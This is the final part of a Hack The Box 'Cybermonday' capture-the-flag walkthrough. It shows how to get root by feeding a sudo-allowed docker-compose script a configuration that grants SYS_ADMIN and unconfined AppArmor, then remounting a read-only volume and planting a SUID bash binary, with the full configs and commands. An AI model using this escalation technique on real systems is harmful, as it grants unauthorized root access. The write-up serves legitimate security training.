# HTB Cybermonday - Composing Root Access

[Initial Enumeration](htb-cybermonday-1-initial-enumeration.md)
[Webhook API Admin Access](htb-cybermonday-2-webhook-api-admin.md)
[Obtaining More Info](htb-cybermonday-3-obtaining-more-info.md)
[Gaining a Foothold](htb-cybermonday-4-gaining-a-foothold.md)
[Where to Now?](htb-cybermonday-5-where-to-now.md)
[Reading the Source](htb-cybermonday-6-reading-the-source.md)
[**Composing Root Access**](htb-cybermonday-7-composing-root-access.md)

Okay, I know that getting to user was a slog, but getting root is much easier, I promise. Look this is the last part left. After doing our initial enumeration again, we don't find much that could be exploited except for a Python script called `secure_compose.py`. We're able to read the file so let's view it and see what's going on.
```python
#!/usr/bin/python3
import sys, yaml, os, random, string, shutil, subprocess, signal

def get_user():
    return os.environ.get("SUDO...
```

It looks like this script takes a docker-compose.yml file from a user, builds any images in it, and runs the containers. What makes it secure is the fact that you're unable to create privileged containers, and all file mounts are restricted to specific places and must be read only. It also checks you're not cheating the file location using a Symlink. Lucky for us this is all it checks, and Docker has a number of features that let us abuse this script to gain root. In our case, we're simply going to create a SUID `bash` executable that will let us gain a root shell. But how are we going to do that if all our mounts are read only? Well remount them as read/write of course.

First we need to prepare a `docker-compose.yml`, `Dockerfile`, and `run.sh` file for our container. In theory you could do everything in the `docker-compose` but we're going to keep each part separate and simple so it's clear what's happening. In order to remount a directory, we need to give our container the `SYS_ADMIN` capability and add the security option `apparmor:unconfined`. As for the image to use, we'll go back to our trusty `cybermonday_api` since we know the host is already running it. As the script copies our `docker-compose` file to a temporary folder, we'll need to specify the location of the `Dockerfile`.

So our `docker-compose.yml` should look like:
```yaml
version: '3'
services:
  exploit:
    build: /home/john/docker
    volumes:
      - /home/john/docker:/mnt:ro
    cap_add:
      - SYS_ADMIN
    security_opt:
      - apparmor:unconfined
```

Our `Dockerfile` should look like:
```dockerfile
FROM cybermonday_api:latest
COPY run.sh /opt/run.sh
CMD /bin/sh /opt/run.sh
```

And finally for our script we'll run:
```shell
$ mount -o remount,rw /mnt
$ cp /bin/bash /mnt/bash
$ chown root:root /mnt/bash
$ chmod 4777 /mnt/bash
```

Upload these all to a folder called `docker` in the home directory for `john`. It's easier to keep track of everything that way and we can just delete the folder to clean up once we're done so it's not spoilt for the next person. Once you're got everything ready it's time to run secure compose. 
```shell
$ sudo /opt/secure_compose.py docker-compose.yml
```

`ls` our directory and we should see a shiny new `bash` executable. Let's try running it now.
```shell
$ ./bash -p

./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found...
```

Oh dear. It looks like the `cybermonday_api` image uses a different version of `glibc`. Not to worry, there is one place where we know that we have a working copy of `bash`; the host itself. Let's change our `run.sh` script slightly.
```shell
$ mount -o remount,rw /mnt
$ chown root:root /mnt/bash
$ chmod 4777 /mnt/bash
```

Then we just copy `bash` into our `docker` directory, and run the `secure_compose` script again.
```shell
$ cp /bin/bash ~/docker
$ sudo /opt/secure_compose.py docker-compose.yml
$ ./bash -p

bash-5.1# whoami
root
```

Copy the root flag from `/root/root.txt` and delete the `~/docker` directory, then celebrate that you've finished this machine.